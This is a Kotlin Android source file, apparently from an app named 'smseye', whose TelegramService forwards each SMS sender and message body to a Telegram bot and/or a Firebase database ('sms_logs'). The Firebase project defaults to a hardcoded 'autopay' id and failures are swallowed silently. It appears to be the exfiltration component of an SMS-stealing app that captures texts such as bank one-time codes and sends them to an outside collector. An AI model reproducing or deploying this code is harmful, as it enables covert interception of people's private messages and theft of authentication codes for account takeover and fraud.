package com.example.smseye

import android.content.Context
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.net.URLEncoder

object TelegramService {
    private val client = OkHttpClient()

    fun forwardSms(context: Context, sender: String, message: String) {
        val prefs = context.getSharedPreferences("Settings", Context.MODE_PRIVATE)
        val modeIndex = prefs.getInt("mode_index", 0)
        
        val cleanText = "$sender: $message"
        val encodedText = try { URLEncoder.encode(cleanText, "UTF-8") } catch (e: Exception) { cleanText }

        // Telegram
        if (modeIndex == 0 || modeIndex == 2) {
            val token = prefs.getString("bot_token", "")
            val chatId = prefs.getString("chat_id", "")
            if (!token.isNullOrEmpty() && !chatId.isNullOrEmpty()) {
                val url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=$encodedText"
                val request = Request.Builder().url(url).build()
                client.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {}
                    override fun onResponse(call: Call, response: Response) { response.close() }
                })
            }
        }

        // Firebase
        if (modeIndex == 1 || modeIndex == 2) {
            val fbId = prefs.getString("fb_id", "autopay-c8eea")
            val url = "https://$fbId-default-rtdb.firebaseio.com/sms_logs.json"
            val json = JSONObject().apply {
                put("sender", sender); put("message", message); put("time", System.currentTimeMillis())
            }
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder().url(url).post(body).build()
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {}
                override fun onResponse(call: Call, response: Response) { response.close() }
            })
        }
    }
}
